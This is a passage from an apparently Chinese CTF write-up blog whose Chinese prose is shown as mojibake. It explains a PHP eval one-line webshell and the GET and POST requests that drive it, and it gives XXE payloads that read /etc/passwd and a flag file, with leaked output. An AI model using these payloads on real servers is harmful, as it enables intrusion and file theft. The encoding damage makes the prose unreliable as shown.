<li><p><strong>eval()å‡½æ•°</strong> : ä¼šæŠŠé‡Œé¢çš„å˜é‡å½“æˆphpä»£ç æ¥æ‰§è¡Œ.<br>å¦‚æœè¯´ <code>$_post[&#39;cmd&#39;]</code> æ­¤æ—¶çš„å€¼æ˜¯<code>print &#39;hello world&#39;</code>, é‚£ä¹ˆå®ƒè¿è¡Œèµ·æ¥çš„å›æ˜¾å°±æ˜¯<code>hello world</code><br>å¦‚æœ<code>%_post[&#39;cmd&#39;]</code>çš„å€¼æ˜¯<code>system(&#39;cat flag&#39;)</code>, é‚£ä¹ˆåœ¨æœåŠ¡å™¨ç«¯å°±ä¼šæ‰§è¡Œ<code>cat flag</code>å‘½ä»¤å¹¶åœ¨æµè§ˆå™¨ä¸Šå›æ˜¾<br>ä¹Ÿå°±æ˜¯è¯´, è¿æ¥ä¸Šäº†ä¸€å¥è¯, ä½ å°±å¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°éšä¾¿<del>åšçˆ±åšçš„äº‹æƒ…</del>æäº‹, å‰ææ˜¯æœ‰è¶³å¤Ÿçš„æƒé™</p>
</li>
<li><p><strong>$_post[â€˜cmdâ€™]</strong> : ä¸€å¥è¯çš„ç›®çš„æ˜¯æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤, é‚£ä¹ˆå®ƒå°±éœ€è¦ä¸€ä¸ªå˜é‡æ¥æ¥æ”¶æˆ‘ä»¬ä¼ æ¥çš„æ•°æ®, $_post[â€˜cmdâ€™]å°±æ˜¯å¹²è¿™ä¸ªçš„, å®ƒä¼šä»httpçš„POSTæ•°æ®åŒ…ä¸­æ¥æ”¶ä¸€ä¸ªåä¸º<code>cmd</code>çš„å‚æ•°.<br>é—®é¢˜æ˜¯, å¦‚æœè¿™ä¸ªä¸€å¥è¯æœ¨é©¬æ˜¯åˆ«äººæ¤å…¥çš„, é‚£æˆ‘å°±ä¸çŸ¥é“è¿™ä¸ªå‚æ•°çš„åå­—æ˜¯ä»€ä¹ˆ, ä¹Ÿå°±æ— æ³•æ­£ç¡®çš„<del>åšçˆ±åšçš„äº‹</del>ä¼ å‚. æ‰€ä»¥è¿™é‡Œçš„å‚æ•°ååˆèµ·åˆ°äº†å¯†ç çš„ä½œç”¨, è®©æˆ‘ä»¬çš„ä¸€å¥è¯åªä¸ºè‡ªå·±æ‰€ç”¨.</p>
</li>
<li><p><strong>@</strong> ç¬¦å·çš„ä½œç”¨æ˜¯ : å¦‚æœä»£ç é”™è¯¯æ‰§è¡Œ, ä¸æŠŠæŠ¥é”™ä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥.<br>ä¸ºä»€ä¹ˆè¦è¿™æ ·åšå‘¢? å› ä¸ºå‡å¦‚æˆ‘ä»¬ä¸ä¼ å‚æ•°æ‰§è¡Œä»£ç , é‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šå–„æ„çš„æŠ¥é”™:</p>
<blockquote>
<p>Noticeï¼Œä½ çš„cmdå˜é‡æ²¡æœ‰å®šä¹‰ã€‚</p>
</blockquote>
<p>äºæ˜¯å¯†ç å°±è¢«æœåŠ¡å™¨æš´éœ²äº†.<br>@ å°±å¯ä»¥é¿å…è¿™ç§å°´å°¬çš„åœºé¢</p>
</li>
</ul>
<p>å…¶å®æˆ‘è§‰å¾—ä¸Šæ¥å°±ç”¨èœåˆ€æ§åˆ¶ä¸€å¥è¯æœ¨é©¬å¹¶ä¸å¥½,<br>å› ä¸ºè¿™ä¸ªå·¥å…·æŠŠåº•å±‚çš„ä¸œè¥¿éƒ½å°è£…å¥½äº†.<br>æˆ‘æ·±ä¿¡, è¦æƒ³çœŸæ­£ç†è§£æŸæ ·ä¸œè¥¿, è¶Šæ¥è¿‘åº•å±‚, è¶Šæœ‰åŠ©äºæ·±å…¥.<br>æ‰€ä»¥è¦å…ˆå­¦ä¼š<strong>ä½¿ç”¨æµè§ˆå™¨è¿æ¥ä¸€å¥è¯æœ¨é©¬</strong></p>
<p>åœ¨æ¯”èµ›çš„æ—¶å€™, è§åˆ°å­¦é•¿åœ¨urlä¸Šè®¾ç½®payload,<br>æ‰€ä»¥æˆ‘æƒ³è®¾ç½®urlçš„payloadè¿æ¥ä¸€å¥è¯,<br><code>http://whoisyourdaddy.cf/test.php?cmd=system(&#39;ls&#39;);</code><br>æŒ‰ç…§æˆ‘ä»¬ä¸Šé¢çš„åˆ†æ, phpä»£ç å°±ä¼šæ‰§è¡Œ<code>system(&#39;ls&#39;);</code>, å›æ˜¾å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶.<br>(ä¸€å®šä¸è¦å¿˜è®°åé¢çš„ <code>;</code>è¡€çš„æ•™è®­ğŸ˜­)<br><font size="5"><strong>ç„¶è€Œ :</strong></font><br><img src="http://whoisyourdaddy.cf/picture/kongkongde.png" alt></p>
<p>è¿™æ˜¯å› ä¸º, <strong>$_postæ ¹æœ¬ä¸æ¥æ”¶ç”¨GETæ–¹æ³•ä¼ æ¥çš„å‚æ•°!</strong><br>$_poståªæ¥æ”¶ä½¿ç”¨POSTæ–¹æ³•æ¥å—çš„è¡¨å•æ•°æ®.</p>
<p>ç®€å•èµ·è§, æˆ‘ä»¬å…ˆç”¨urlä½œä¸ºpayload, é‚£ä¹ˆ, éœ€è¦æŠŠä»£ç æ”¹æˆ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®ä¸€ä¸‹.<br><img src="http://whoisyourdaddy.cf/picture/ls.png" alt><br>æˆåŠŸäº†.</p>
<p>åŒç†, è¦æƒ³ä½¿ç”¨POSTæ–¹æ³•ä¼ é€’æ•°æ®, å¯ä»¥ç”¨</p>
<ul>
<li>Chrome çš„æ’ä»¶ Hackbar</li>
<li>Burp Suite change method</li>
<li>Post man ç”Ÿæˆ payload</li>
</ul>
<p>æˆ‘æˆåŠŸçš„ä½¿ç”¨Burp çš„ change method åŠŸèƒ½å’Œ PostMan å®ç°äº†.<br>postmançš„ä½¿ç”¨æœ‰äº›å‘è¦æ³¨æ„, å¦‚å›¾<br><img src="http://whoisyourdaddy.cf/picture/postman.png" alt></p>
<p>####POSTå’ŒGETæ•°æ®åŒ…çš„å¯¹æ¯”<br>GET:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /test.php?cmd=system(%27ls%27); HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>POST:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">cmd=system(%27ls%27);</span><br></pre></td></tr></table></figure>

<p>ä¸€å¥è¯æœ¨é©¬å…ˆåˆ†æåˆ°è¿™é‡Œ.</p>
<p>####å…¶ä»–æ¼æ´<br>ç”±äºçº¿ä¸‹èµ›çš„æœåŠ¡å™¨åœ¨æ¯”èµ›ç»“æŸåå°±å…³é—­äº†, å¾ˆå¤šé¢˜ç›®ä¹Ÿä¸æ–¹ä¾¿å¤ç°.<br>ä¸»è¦è¯´ä¸€ä¸‹æ€è·¯å°±å¥½äº†</p>
<ul>
<li>web1<br>å‰é¢çš„ä¸€å¥è¯æœ¨é©¬å·²ç»åˆ†æè¿‡äº†,<br>å…¶ä¿®è¡¥æ¼æ´çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å• : ç›´æ¥åˆ é™¤æœ¨é©¬æ–‡ä»¶, ä¸€äº†ç™¾äº†.<br>é™¤äº†ä¸Šé¢çš„ä¸€å¥è¯æ¼æ´, è¿˜æœ‰é’ˆå¯¹finecmsçš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´<br>æˆ‘è®¤ä¸ºè¿™ä¸ªæ¼æ´çš„æ ¹æºæ˜¯urlè¿‡æ»¤ä¸å¤Ÿä¸¥æ ¼<br>é¢˜ç›®ä¸€å¼€å§‹çš„ä»£ç åªæ›¿æ¢<code>../</code>ä¸º<code></code>,<br>ä¿®è¡¥æ–¹å¼æ˜¯, å¾ªç¯æ›¿æ¢<code>../</code>, è®©ä¸æ³•åˆ†å­æ— æœºå¯ä¹˜<br><img src="http://whoisyourdaddy.cf/picture/welcome.png" alt="web1çš„logo,çœŸçš„å¾ˆçš®"><br><del>è¿™æ®µä»£ç , æˆ‘ä¿®çš„ (å‰è…°)</del></li>
<li>web2<br>åœ¨é¢˜ç›®ç»™çš„ç«™çš„æŸå¤„, å¯ä»¥ä¸Šä¼ å›¾ç‰‡,<br>ä½†æ˜¯å¯¹æ–‡ä»¶æ ¼å¼çš„æ£€æµ‹å´å¾ˆå®½æ¾.<br>ä¿å­˜ç€ä¸Šä¼ å›¾ç‰‡çš„åœ°æ–¹ä¹Ÿæ²¡æœ‰é™åˆ¶è®¿é—®.<br>ç›´æ¥å›¾ç‰‡é©¬èµ°èµ·å®‰æ’.<br>å¯ä»¥å‚è€ƒ <a href="http://whoisyourdaddy.cf/æ¸—é€æµ‹è¯•&ä¸Šä¼ æ¼æ´.html" target="_blank" rel="noopener">æ¸—é€æµ‹è¯•&amp;ä¸Šä¼ æ¼æ´</a></li>
<li>è‡³äºpwn1å’Œpwn2 , , , æ‰“æ‰°äº†æ‰“æ‰°äº†</li>
</ul>
<h3 id="apiè°ƒç”¨-resolved"><a href="#apiè°ƒç”¨-resolved" class="headerlink" title="apiè°ƒç”¨(resolved)"></a><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">apiè°ƒç”¨</a>(resolved)</h3><p>è¿™é“é¢˜åˆ©ç”¨çš„æ˜¯xxeæ¼æ´<br>é‚£ä¹ˆ<a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">ä»€ä¹ˆæ˜¯xxeæ¼æ´å‘¢?</a></p>
<blockquote>
<p>ç®€å•æ¥è¯´ï¼ŒXXEå°±æ˜¯XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚å½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå°±å¯èƒ½å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ¢æµ‹ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p>
</blockquote>
<p><font size="2">å’³, è¿™è¯´çš„ä¸€ç‚¹ä¹Ÿä¸ç®€å•å•Š(å°å£°bb) </font><br>å¯¹ç€å…¶ä¸­å‡ ä¸ªé™Œç”Ÿçš„åè¯æ¥å­¦ä¹ ä¸‹:</p>
<ul>
<li><p>XML : </p>
<blockquote>
<p>å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„å­é›†ï¼Œæ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ã€‚</p>
</blockquote>
<p>  æ ¹æ®æˆ‘è‡ªå·±çš„ç†è§£, åº”è¯¥å°±æ˜¯ä¸€ç§å¯ä»¥<strong>æ–¹ä¾¿è®¡ç®—æœºç†è§£</strong>çš„, ä½¿<strong>å†…éƒ¨æ•°æ®å…·æœ‰æ¸…æ™°é€»è¾‘ç»“æ„</strong>çš„ä¸€ç§<strong>æ ‡è®°è¯­è¨€</strong><br>  ç¤ºä¾‹ä»£ç å¦‚ä¸‹: </p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cookie: mycookie=cookies;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>XML is the best!<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>è¯­æ³•ä¸Š:<br>è¿™æ®µä»£ç ä¸­å®šä¹‰äº†ä¸€ä¸ªæ ¹å…ƒç´ â€“<code>catalog</code>, <code>id</code>æ˜¯<code>core</code>çš„ä¸€ä¸ªå±æ€§, <code>author</code>å’Œ<code>title</code>åˆ™æ˜¯<code>core</code>çš„å­å…ƒç´ , <code>core</code>æ˜¯<code>catalog</code>çš„å­å…ƒç´ </p>
</li>
<li><p>åŠŸèƒ½ä¸Š:<br>æ³¨æ„çœ‹ä»£ç çš„å¼€å¤´éƒ¨åˆ†, æ˜¯POSTæ–¹æ³•çš„<strong>Header</strong>. æ‰€ä»¥å…¶å®è¿™æ®µä»£ç æœ¬è´¨ä¸Šä»ç„¶æ˜¯ä¸€ä¸ª<strong>POSTæ–¹æ³•çš„httpæ•°æ®åŒ…</strong>, æœ¬è´¨ä¸Šå’Œæˆ‘ä»¬ä¹‹å‰åˆ†æçš„post|getæ•°æ®åŒ…æ²¡åŒºåˆ«. å…¶ä½œç”¨æ— éæ˜¯å‘æœåŠ¡å™¨æäº¤ä¸€ä»½æ•°æ®è€Œå·². è‡³äºæ€ä¹ˆå¤„ç†, é‚£å°±çœ‹æœåŠ¡ç«¯çš„ç¨‹åºæ˜¯æ€æ ·çš„äº†</p>
<br>  </li>
</ul>
</li>
<li><p><strong>å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“</strong> :<br>  ä¸è¿‡, å¦‚æœæ˜¯ä¸‹é¢çš„è¿™æ®µä»£ç , å°±ä¼šæˆä¸ºæ‰€è°“çš„æ¶æ„payload, å¦‚ä¸‹:</p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  è¿™æ®µä»£ç ä¸ä¸Šé¢çš„åªæœ‰ä¸¤è¡Œä¸ä¸€æ ·</p>
<ul>
<li><p><code>&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</code></p>
</li>
<li><p><code>&lt;description&gt;&amp;xxe;&lt;/description&gt;</code><br>å…¶ä¸­<code>&amp;xxe</code>å°±æ˜¯æ¶æ„å¼•ç”¨äº†å¤–éƒ¨çš„æ–‡ä»¶(å®ä½“):<code>file:///etc/passwd</code></p>
<br>
è¿™ä»½æ•°æ®åŒ…å¦‚æœå‘é€ç»™æœåŠ¡å™¨, ä»£ç è¢«è§£é‡Šå¹¶è¿”å›

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;no results for description root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync...&#125;</span><br></pre></td></tr></table></figure>

<p>â€œæ— æ„â€ä¸­å°±æŠŠæ–‡ä»¶çš„å†…å®¹æ³„æ¼å‡ºæ¥äº†.</p>
<br>
ä»¥ä¸Šå°±æ˜¯é€šè¿‡ç›´æ¥DTDå¤–éƒ¨å®ä½“å£°æ˜å®ç°çš„xxe. ç†è®ºä¸Šå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–.

<p>ä¸è¿‡è¿™ä¸€åˆ‡çš„å‰ææ˜¯, <strong>å…è®¸å¯¹å¤–éƒ¨å®ä½“çš„å¼•ç”¨</strong></p>
</li>
</ul>
</li>
</ul>
<p>å¥½çš„, å‰æœŸçŸ¥è¯†åŸºç¡€çš„é“ºå«å°±å…ˆè¿™ä¹ˆå¤š.<br>å›åˆ°åˆšæ‰çš„é¢˜ç›®ä¸Šæ¥, æˆ‘ä»¬æŸ¥çœ‹ä¸‹index.phpçš„æºä»£ç , æœ‰è¿™ä¹ˆä¸€æ®µ js ä»£ç </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr;</span><br><span class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"> <span class="keyword">var</span> xhr = XHR();</span><br><span class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line">             tip_area.value = data.task.search+data.task.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>emmm, è¿™æ®µä»£ç æœ‰å¤ªå¤šæˆ‘é™Œç”Ÿçš„æ–¹æ³•äº†, å…¨é¢çš„ç†è§£å¯¹è§£é¢˜æ¥è¯´æ€§ä»·æ¯”å¤ªä½äº†.<br>ä¸è¿‡å¦‚æœèƒ½æ•æ‰åˆ°å…¶ä¸­çš„å…³é”®å­—<code>XML</code>æˆ‘æƒ³å¯¹è§£é¢˜åº”è¯¥èƒ½èµ·åˆ°ä¸€ä¸ªå¾ˆå¥½çš„æç¤ºä½œç”¨å§.<br>æ€»ä¹‹, å‡è®¾æˆ‘ä»¬ç°åœ¨å·²ç»çŸ¥é“è¿™é“é¢˜ç›®æ˜¯æœ‰xxeæ¼æ´çš„, é‚£ä¹ˆå°±å¯ä»¥ç”¨åˆšæ‰çš„æ–¹æ³•è¯»å–flagæ–‡ä»¶!<br><br><br>ç‚¹å‡»é¢˜ç›®çš„é‚£ä¸ª<code>GO</code><br>ç”¨<code>Burp Suite</code>æŠ“åŒ…. å‘ç°æ˜¯<code>POST</code>æ–¹æ³•, bodyä¸­æœ‰ä¸€æ®µjsonæ ¼å¼çš„ä»£ç . å¼ƒä¹‹.<br>æˆ‘ä»¬è¦ä¼ xmlçš„æ•°æ®.<br>æ‰€ä»¥é¦–å…ˆæŠŠ<code>Content-Type</code>æ”¹æˆ<code>application/xml</code><br>å†åœ¨<code>body</code>ä¸­æ„é€ å¦‚ä¸‹payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE abcd[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY any SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">something</span>&gt;</span>&amp;any;<span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæ•ˆæœå›¾ :<br><img src="http://whoisyourdaddy.cf/picture/xxe.png" alt><br>ojbk.</p>
<p>###<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002" target="_blank" rel="noopener">mfw</a>(resolved)</p>
<p>åœ¨é¢˜ç›®ä¸­çœ‹åˆ°äº†å‡ºé¢˜è€…ä½¿ç”¨äº†Git, å¯ä»¥çŒœæµ‹æ˜¯Source Leak, ä½¿ç”¨GitHackè„šæœ¬, èƒ½ä¸‹è½½éƒ¨åˆ†æºä»£ç .<br><img src="http://whoisyourdaddy.cf/picture/GitHack.png" alt></p>
<p>å…¶å®ä¸€å¼€å§‹ä»¥ä¸ºè¦ç”¨ç›®å½•æ‰«æå·¥å…·, é¡ºä¾¿è®°å½•ä¸‹ç›®å½•æ‰«æçš„æ–¹æ³•, å¯ä»¥ç”¨Kaliè‡ªå¸¦çš„<code>dirbuster</code>, ä¹Ÿå¯ä»¥ç”¨Githubä¸Šçš„å¼€æºå·¥å…·<code>dirsearch</code>.<br>è¿™é‡Œæ¨èç”¨åè€…, å› ä¸ºå®ƒç®€å•æ˜“ç”¨ä¸”ååˆ†å¼ºå¤§.<br><strong>ä½¿ç”¨æ–¹æ³•</strong> : <code>python dirsearch.py -u [URL] -e *</code></p>
<p>è¨€å½’æ­£ä¼ <br>åœ¨ä¸‹è½½ä¸‹çš„ç›®å½•ä¸­çœ‹åˆ°æœ‰ä¸ª<code>\templates\flag.php</code>, è¿›å»åå†™ç€TODO, è¿™å…¶å®ç»™äº†æˆ‘ä»¬æç¤º, <strong>è¦æƒ³åŠæ³•è¯»å–è¿™ä¸ªflag.php</strong>.</p>
<p>å†æ¥å®¡è®¡index.phpçš„ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span 